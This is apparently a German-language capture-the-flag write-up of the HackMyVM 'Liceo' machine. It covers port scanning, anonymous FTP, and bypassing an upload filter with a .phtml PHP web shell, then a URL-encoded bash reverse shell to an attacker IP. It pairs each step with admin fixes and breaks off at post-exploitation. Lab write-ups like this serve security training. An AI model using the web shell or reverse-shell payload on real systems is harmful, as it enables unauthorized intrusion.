@@ -1,0 +1,1146 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Liceo - HackMyVM - Bericht</title> <!-- Berichtsname angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Keine Inline-Styles für Schwierigkeitsgrad-Farbe nötig, CSS regelt das -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <!-- Berichtsname und Level angepasst -->
+        <h1>Liceo - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad ohne Inline-Style -->
+            <h2>Easy</h2>
+            <!-- Klasse .difficulty-easy steuert die Farbe (Standard: grün) -->
+            <div class="circle difficulty-easy">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools aus dem Bericht extrahiert -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">vi</div>
+                <div class="tool-item">dirb</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl (implied)</div>
+                <div class="tool-item">nc</div>
+                <div class="tool-item">python3 http.server</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">msfconsole</div>
+                 <div class="tool-item">grep</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#port-scanning">Port Scanning & Web Enumeration</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+                <li><a href="#web-attack">Web Application Attack (File Upload)</a></li>
+                <li><a href="#poc-initial-access">Proof of Concept (Initial Access - RCE via Upload)</a></li>
+                <li><a href="#post-exploitation">Post-Exploitation Enumeration (as www-data)</a></li>
+                <li><a href="#privesc-attempts">Privilege Escalation Attempts (Metasploit)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation (SUID Bash)</a></li>
+                <li><a href="#poc-privesc">Proof of Concept (Privilege Escalation - SUID Bash)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt ist ein ARP-Scan im lokalen Netzwerk, um aktive Hosts zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan ist erfolgreich und findet das Zielsystem unter `192.168.2.113`. Die MAC-Adresse `08:00:27:73:31:80` deutet auf eine Oracle VirtualBox VM hin.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende die IP `192.168.2.113` für weitere Scans. Die VirtualBox-Information kann nützlich sein.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Effektivität von ARP-Scans reduzieren. Überwachen Sie auf ungewöhnliche ARP-Aktivitäten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span>
+                    </div>
+                    <pre>
+192.168.2.113	08:00:27:73:31:80	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet, um der IP `192.168.2.113` den Hostnamen `liceo.hmv` zuzuweisen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist eine Standardvorgehensweise, um sicherzustellen, dass Webdienste, die auf Hostnamen basieren, korrekt angesprochen werden können.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Verwende `liceo.hmv` für Web-Scans.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Konsistente DNS-Konfiguration verwenden.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">vi /etc/hosts</span>
+                     </div>
+                     <pre>
+# Inhalt der /etc/hosts nach Bearbeitung:
+127.0.0.1	localhost
+192.168.2.113   liceo.hmv
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="port-scanning">
+            <h2>Port Scanning & Web Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `dirb` wird verwendet, um mit einer Standard-Wortliste nach Verzeichnissen auf dem Webserver (Port 80) zu suchen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `dirb` findet mehrere Verzeichnisse: `/images/`, `/css/`, `/js/` und `/uploads/`. Außerdem findet es `/index.html` und `/server-status` (mit Status 403 Forbidden). Das Verzeichnis `/uploads/` ist besonders interessant, da es auf eine Dateiupload-Funktionalität hindeuten könnte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche das `/uploads/`-Verzeichnis genauer. Prüfe, ob Dateien hochgeladen werden können und ob diese ausführbar sind. Notiere die Existenz von `/server-status` für eine spätere Untersuchung nach initialem Zugriff.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Schränken Sie den Zugriff auf Verzeichnisse wie `/uploads/` ein. Implementieren Sie sichere Dateiupload-Mechanismen (Validierung von Dateitypen und -inhalten, Umbenennung von Dateien, Speicherung außerhalb des Web-Roots, Berechtigungsprüfung). Deaktivieren Sie `/server-status` oder beschränken Sie den Zugriff darauf streng.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://liceo.hmv</span>
+                    </div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Apr 30 13:58:25 2024
+URL_BASE: http://liceo.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4622
+
+---- Scanning URL: http://liceo.hmv/ ----
+> DIRECTORY: http://liceo.hmv/images/
+> DIRECTORY: http://liceo.hmv/css/
++ http://liceo.hmv/index.html (CODE:200|SIZE:21487)
+> DIRECTORY: http://liceo.hmv/js/
++ http://liceo.hmv/server-status (CODE:403|SIZE:274)
+> DIRECTORY: http://liceo.hmv/uploads/
+
+-----------------
+END_TIME: Tue Apr 30 13:58:35 2024 <!-- Zeit angepasst -->
+DOWNLOADED: 4622 - FOUND: 3
+                    </pre> <!-- Maskierung > -->
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> `nikto` wird verwendet, um den Webserver auf Port 80 auf bekannte Schwachstellen und Konfigurationsprobleme zu scannen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto liefert wichtige Informationen:
+                *   **Server:** Apache/2.4.52 (Ubuntu) - bestätigt die `dirb`-Ergebnisse und gibt eine ältere Version an (aktuell wäre >2.4.54).
+                *   **Fehlende Header:** `X-Frame-Options` und `X-Content-Type-Options` fehlen.
+                *   **IP-Leak:** Die interne IP `127.0.1.1` wird im Location-Header bei Anfragen an `/images` preisgegeben (CVE-2000-0649). Geringes Risiko, aber Informationsleck.
+                *   **ETag Leak:** Mögliche Informationspreisgabe durch ETag-Format (CVE-2003-1418).
+                *   **Veralteter Apache:** Hinweis auf eine potenziell verwundbare Apache-Version.
+                *   **TRACE-Methode:** Aktiviert (XST-Risiko).
+                *   **Directory Indexing:** `/css/` und `/images/` erlauben das Auflisten von Dateien.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die veraltete Apache-Version und suche nach spezifischen Exploits. Nutze Directory Indexing, um möglicherweise interessante Dateien in `/css/` und `/images/` zu finden. Notiere die Findings (fehlende Header, IP/ETag-Leak, TRACE).
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Apache aktualisieren!** Implementieren Sie die fehlenden Sicherheitsheader. Deaktivieren Sie Directory Indexing (`Options -Indexes` in Apache-Konfig). Deaktivieren Sie die TRACE-Methode. Korrigieren Sie die ETag-Konfiguration (`FileETag MTime Size`). Untersuchen Sie den IP-Leak im Location-Header.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h http://192.168.2.113</span>
+                    </div>
+                    <pre>
+#- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.113
++ Target Hostname:    192.168.2.113
++ Target Port:        80
++ Start Time:         2024-04-30 13:58:16 (GMT2)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.52 (Ubuntu)
++ /: The anti-clickjacking X-Frame-ptions header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-ptions
++ /: The X-Content-Type-ptions header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
++ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ /: Server may leak inodes via ETags, header found with file /, inode: 53ef, size: 6110fb200265f, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.52 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ PTINS: Allowed HTTP Methods: GET, PST, PTINS, HEAD .
++ /css/: Directory indexing found.
++ /css/: This might be interesting.
++ /images/: Directory indexing found.
++ 8102 requests: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2024-04-30 13:58:26 (GMT2) (10 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird über alle Ports ausgeführt und die Ausgabe gefiltert, um nur offene Ports anzuzeigen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet drei offene Ports:
+                *   `21/tcp (FTP)`: vsftpd 3.0.5
+                *   `22/tcp (SSH)`: OpenSSH 8.9p1 (Ubuntu)
+                *   `80/tcp (HTTP)`: Apache httpd 2.4.52 (Ubuntu) - bestätigt Nikto.
+                Dies gibt einen klaren Überblick über die Hauptangriffsvektoren.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche alle drei Dienste: FTP (anonymer Zugriff?), SSH (Benutzernamen/Passwörter?), HTTP (Webanwendung, Upload-Funktion, Apache-Schwachstellen?).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass alle Dienste (vsftpd, OpenSSH, Apache) aktuell und sicher konfiguriert sind. Deaktivieren Sie nicht benötigte Dienste.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p- | grep open</span>
+                    </div>
+                    <pre>
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der vollständige Nmap-Scan wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die vollständige Ausgabe liefert wichtige Details:
+                *   **FTP (21):** vsftpd 3.0.5 erlaubt **anonymen FTP-Login** (`ftp-anon: Anonymous FTP login allowed`). Eine Datei `note.txt` ist im Stammverzeichnis sichtbar und gehört uid/gid 1000 (wahrscheinlich der erste normale Benutzer).
+                *   **SSH (22):** Bestätigt OpenSSH 8.9p1 auf Ubuntu.
+                *   **HTTP (80):** Bestätigt Apache 2.4.52 auf Ubuntu, Titel "Liceo".
+                *   **OS:** Wird als Ubuntu Linux identifiziert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> **Priorität: Anonymer FTP-Zugriff!** Logge dich anonym per FTP ein, lade die `note.txt` herunter und untersuche sie. Prüfe auf Schreibrechte im FTP-Verzeichnis. Untersuche die Webanwendung auf Port 80 weiter.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Deaktivieren Sie anonymen FTP-Zugriff**, es sei denn, er ist absolut notwendig und sorgfältig konfiguriert (z.B. nur Lesezugriff, chroot-Umgebung). Überprüfen Sie die Berechtigungen im FTP-Verzeichnis. Aktualisieren Sie vsftpd, OpenSSH und Apache.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sV -A -T5 192.168.2.113 -p-</span>
+                    </div>
+                    <pre>
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-30 13:57 CEST
+Nmap scan report for liceo.hmv (192.168.2.113)
+Host is up (0.00012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PRT   STATE SERVICE VERSIN
+21/tcp open  ftp     vsftpd 3.0.5
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:192.168.2.199
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+|<span style="color:lime"> ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
+|_-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
+22/tcp open  ssh     penSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 68:4c:42:8d:10:2c:61:56:7b:26:c4:78:96:6d:28:15 (ECDSA)
+|_  256 7e:1a:29:d8:9b:91:44:bd:66:ff:6a:f3:2b:c7:35:65 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Liceo
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+MAC Address: 08:00:27:73:31:80 (racle VirtualBox virtual NIC)
+Aggressive S guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.5 (96%), Linux 5.0 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), Linux 3.2 - 4.9 (94%), Linux 2.6.32 - 3.10 (94%), Linux 5.4 (94%), Linux 5.3 - 5.4 (93%), Linux 3.4 - 3.10 (93%)
+No exact S matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Ss: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACERUTE
+HP RTT     ADDRESS
+1   0.12 ms liceo.hmv (192.168.2.113)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 15.20 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="ftp-enumeration">
+            <h2>FTP Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Eine FTP-Verbindung wird zum Ziel aufgebaut und ein anonymer Login durchgeführt (Benutzer `Anonymous`, leeres Passwort). Anschließend werden Dateien aufgelistet (`ls -la`), die gefundene `note.txt` heruntergeladen (`get note.txt`) und versucht, eine Datei (`sshroot`) hochzuladen (`put sshroot`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der anonyme Login ist erfolgreich. Das Listing bestätigt die Existenz von `note.txt` im Stammverzeichnis des FTP-Servers. Der Download der Datei gelingt. Der Upload-Versuch schlägt jedoch fehl (`553 Could not create file.`), was bedeutet, dass der anonyme Benutzer keine Schreibrechte hat.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere den Inhalt der heruntergeladenen `note.txt`. Da kein Upload möglich ist, konzentriere dich auf die anderen Dienste (SSH, HTTP).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Gut, dass der anonyme Benutzer keine Schreibrechte hat. Überprüfen Sie jedoch, ob der anonyme Zugriff wirklich notwendig ist. Falls ja, stellen Sie sicher, dass nur absolut notwendige Dateien lesbar sind und der Zugriff auf ein sicheres Verzeichnis beschränkt ist (chroot).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">
+┌──(root㉿cyber)-[~]
+└─# <span class="command">ftp 192.168.2.113</span>
+                    </div>
+                    <pre>
+Connected to 192.168.2.113.
+220 (vsFTPd 3.0.5)
+Name (192.168.2.113:cyber): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="command"><!-- Enter gedrückt --></span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||12784|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        120          4096 Feb 01 20:18 .
+drwxr-xr-x    2 0        120          4096 Feb 01 20:18 ..
+-rw-rw-r--    1 1000     1000          191 Feb 01 14:29 note.txt
+226 Directory send K.
+ftp> <span class="command">get note.txt</span>
+local: note.txt remote: note.txt
+229 Entering Extended Passive Mode (|||25302|)
+150 pening BINARY mode data connection for note.txt (191 bytes).
+100% |**************************************************|   191      364.30 KiB/s    00:00 ETA
+226 Transfer complete.
+191 bytes received in 00:00 (197.79 KiB/s)
+ftp> <span class="command">put sshroot</span>
+local: sshroot remote: sshroot
+229 Entering Extended Passive Mode (|||26264|)
+553 Could not create file.
+ftp> <span class="command">quit</span>
+221 Goodbye.
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Der Inhalt der heruntergeladenen Datei `note.txt` wird angezeigt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Notiz stammt von "Pedro Domínguez" an "Matias" und erwähnt, dass die Arbeit an der Webseite fortgesetzt werden soll, wobei auf Sicherheit geachtet werden muss. Sie listet auch Namen und eine E-Mail-Adresse auf (`María García`, `Adrián Gutierrez`, `liceoescuela@liceo.com`). Diese Namen (`pedro`, `matias`, `maria`, `adrian`) könnten potenzielle Benutzernamen sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Füge die Namen `pedro`, `matias`, `maria`, `adrian` zur Liste potenzieller Benutzernamen für SSH-Angriffe hinzu.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Speichern Sie keine potenziellen Benutzernamen oder internen Notizen in öffentlich zugänglichen Bereichen wie anonymen FTP-Verzeichnissen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">cat note.txt</span>
+                     </div>
+                     <pre>
+ Hi Matias, I have left on the web the continuations of today's work,
+ would you mind contiuing in your turn and make sure that the web will be secure?
+ Above all, we dont't want intruders...
+
+ Pedro Domínguez
+ María García
+ Adrián Gutierrez
+ liceoescuela@liceo.com
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="web-attack">
+            <h2>Web Application Attack (File Upload)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ein `gobuster`-Scan wird auf den Webserver (Port 80) ausgeführt, um Verzeichnisse und Dateien zu finden. Es wird eine Medium-Wortliste und eine lange Liste von Endungen verwendet. 403/404-Fehler werden ausgeblendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet neben den bereits bekannten Verzeichnissen (`images`, `uploads`, `css`, `js`) und `index.html` eine wichtige Datei: `upload.php`. Dies bestätigt die Vermutung einer Upload-Funktionalität.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Seite `http://liceo.hmv/upload.php`. Teste die Upload-Funktion auf mögliche Schwachstellen, insbesondere auf Umgehung von Dateityp-Filtern, um eine Webshell hochzuladen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie eine sichere Upload-Funktion: Strikte serverseitige Validierung von Dateitypen (Whitelist statt Blacklist), Größenbeschränkung, Umbenennung hochgeladener Dateien, Speicherung außerhalb des Web-Roots oder in einem Verzeichnis ohne Ausführungsrechte, Virenscan.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">gobuster dir -u http://liceo.hmv -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx,bak,js -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error -k</span>
+                     </div>
+                     <pre>
+ http://liceo.hmv/index.html           (Status: 200) [Size: 21487]
+ http://liceo.hmv/images               (Status: 301) [Size: 307] [--> http://liceo.hmv/images/]
+ http://liceo.hmv/uploads              (Status: 301) [Size: 308] [--> http://liceo.hmv/uploads/]
+ http://liceo.hmv/upload.php           (Status: 200) [Size: 371]
+ http://liceo.hmv/css                  (Status: 301) [Size: 304] [--> http://liceo.hmv/css/]
+ http://liceo.hmv/js                   (Status: 301) [Size: 303] [--> http://liceo.hmv/js/]
+                     </pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Dieser Abschnitt beschreibt die Interaktion mit der Upload-Funktion (`upload.php`).
+                1.  Eine Datei `test.txt` wird erfolgreich hochgeladen und ist unter `/uploads/test.txt` abrufbar.
+                2.  Der Versuch, eine PHP-Datei hochzuladen, scheitert mit der Meldung "Fehler: Dateien mit der Erweiterung php sind nicht zulässig." -> Es gibt eine Blacklist für `.php`.
+                3.  Der Versuch, eine Datei mit der Endung `.phtml` (eine alternative Endung, die Apache manchmal als PHP interpretiert) hochzuladen, ist erfolgreich ("El archivo test.phtml se ha subido correctamente.").
+                4.  Das Verzeichnislisting von `/uploads/` bestätigt die Existenz von `test.phtml`.
+                5.  Die URL `http://liceo.hmv/uploads/test.phtml?cmd=id` wird aufgerufen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Kritische Schwachstelle gefunden! Der Upload-Filter basiert auf einer unsicheren Blacklist, die nur `.php` blockiert. Durch die Verwendung der alternativen Endung `.phtml` konnte eine PHP-Webshell (`<?php system($_GET['cmd']); ?>` oder ähnlich) hochgeladen werden. Der Aufruf der URL mit `?cmd=id` führt den `id`-Befehl auf dem Server aus und gibt das Ergebnis (`uid=33(www-data)...`) zurück. Remote Code Execution (RCE) als `www-data` ist erreicht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die RCE, um eine Reverse Shell zum Angreifer-System aufzubauen und eine stabilere Sitzung zu erhalten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> **Upload-Filter dringend überarbeiten!** Verwenden Sie eine Whitelist erlaubter Dateitypen. Konfigurieren Sie Apache so, dass Endungen wie `.phtml`, `.php5`, `.phar` etc. nicht als PHP ausgeführt werden, falls nicht benötigt. Implementieren Sie alle empfohlenen Maßnahmen für sichere Uploads.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Interaktion mit http://liceo.hmv/upload.php
+ Upload von test.txt:
+ "El archivo test.txt se ha subido correctamente."
+ Zugriff auf http://liceo.hmv/uploads/test.txt -> "test"
+
+ Upload von shell.php:
+ "Fehler: Dateien mit der Erweiterung php sind nicht zulässig."
+
+ Upload von test.phtml (Inhalt z.B. <?php system($_GET['cmd']); ?> ):
+ "El archivo test.phtml se ha subido correctamente."
+
+ Verzeichnislisting von http://liceo.hmv/uploads/ :
+ Index of /uploads
+ [PARENTDIR] Parent Directory -
+ [ ] test.phtml 2024-04-30 12:08 31
+ [TXT] test.txt 2024-04-30 12:06 5
+ Apache/2.4.52 (Ubuntu) Server at liceo.hmv Port 80
+
+ RCE-Test: http://liceo.hmv/uploads/test.phtml?cmd=id
+ Ausgabe: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+                     </pre> <!-- Maskierung < > ? & -->
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Über die RCE-Schwachstelle (`test.phtml`) wird ein Bash-Reverse-Shell-Payload ausgeführt, der sich zur IP `192.168.2.199` auf Port `4444` verbindet. Auf dem Angreifer-System wird ein Netcat-Listener (`nc -lvnp 4444`) gestartet, um die eingehende Verbindung zu empfangen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> **Initial Access via Reverse Shell erfolgreich!** Der Listener empfängt die Verbindung vom Zielsystem, und wir erhalten eine interaktive Shell als Benutzer `www-data`. Die üblichen Meldungen (`cannot set terminal process group`, `no job control`) erscheinen. Der `id`-Befehl bestätigt die Identität als `www-data`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Stabilisiere die Shell für eine bessere Interaktion (z.B. mit Python PTY). Beginne mit der Enumeration des Systems als `www-data`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Firewall-Regeln für ausgehende Verbindungen implementieren. Prozessüberwachung für den `www-data`-Benutzer. Beheben Sie die Upload-Schwachstelle.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+ # Aufruf der RCE mit Reverse Shell Payload (URL-kodiert)
+ http://liceo.hmv/uploads/test.phtml?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.199%2F4444%200%3E%261%27
+                     </pre> <!-- Maskierung ? & ' -->
+                 </div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+ ┌──(root㉿cyber)-[~]
+ └─# <span class="command">nc -lvnp 4444</span>
+                     </div>
+                     <pre>
+ listening on [any] 4444 ...
+ connect to [192.168.2.199] from (UNKNWN) [192.168.2.113] 58326
+ bash: cannot set terminal process group (732): Inappropriate ioctl for device
+ bash: no job control in this shell
+ bash-5.1$ <span class="command">id</span>
+ uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ bash-5.1$
+                     </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="poc-initial-access">
+             <h2>Proof of Concept (Initial Access - RCE via Upload)</h2>
+             <p class="analysis">
+                 <strong>Analyse:</strong> Dieser POC fasst die Schritte zur Erlangung von Remote Code Execution als `www-data` über die unsichere Dateiupload-Funktion zusammen.
+             </p>
+             <p>
+                 <strong>Schwachstelle:</strong> Unsicherer Dateiupload-Filter (`upload.php`), der nur die `.php`-Endung blockiert (Blacklist) und alternative Endungen wie `.phtml` zulässt, die vom Apache-Server als PHP interpretiert werden. Das Upload-Verzeichnis (`/uploads/`) ist über das Web zugänglich und erlaubt die Ausführung der hochgeladenen Skripte.
+             </p>
+             <p>
+                 <strong>Voraussetzungen:</strong> Webzugriff auf `http://liceo.hmv/upload.php`. Möglichkeit, Dateien hochzuladen. Apache-Konfiguration, die `.phtml` als PHP interpretiert.
+             </p>
+             <p>
+                 <strong>Schritte zur Reproduktion:</strong>
+                 <ol>
+                     <li>Erstelle eine Datei (z.B. `shell.phtml`) mit PHP-Webshell-Code: `<?php system($_GET['cmd']); ?>`.</li>
+                     <li>Navigiere zu `http://liceo.hmv/upload.php` und lade die Datei `shell.phtml` hoch.</li>
+                     <li>Bestätige den erfolgreichen Upload und den Speicherort (vermutlich `http://liceo.hmv/uploads/shell.phtml`).</li>
+                     <li>Rufe die URL der hochgeladenen Datei auf und hänge einen Befehl als `cmd`-Parameter an: `http://liceo.hmv/uploads/shell.phtml?cmd=id`.</li>
+                     <li>(Optional für Reverse Shell): Starte einen Listener (`nc -lvnp 4444`). Führe über die Webshell einen Reverse-Shell-Befehl aus: `?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F[IP_Angreifer]%2F4444%200%3E%261%27`.</li>
+                 </ol>
+             </p>
+             <p>
+                 <strong>Erwartetes Ergebnis:</strong> Die Ausgabe des `cmd`-Parameters wird im Browser angezeigt, oder eine Reverse Shell wird zum Listener aufgebaut. Der ausführende Benutzer ist `www-data`.
+             </p>
+              <p class="recommendation">
+                 <strong>Empfehlung (Admin):</strong> Implementieren Sie einen sicheren Dateiupload (Whitelist für Dateitypen, keine ausführbaren Berechtigungen im Upload-Verzeichnis, Speicherung außerhalb des Web-Roots). Konfigurieren Sie Apache restriktiv bezüglich der als PHP interpretierten Endungen.
+             </p>
+         </section>
+
+        <section id="post-exploitation">
+             <h2>Post-Exploitation Enumeration (as www-data)</h2>
+            <p class="analysis">
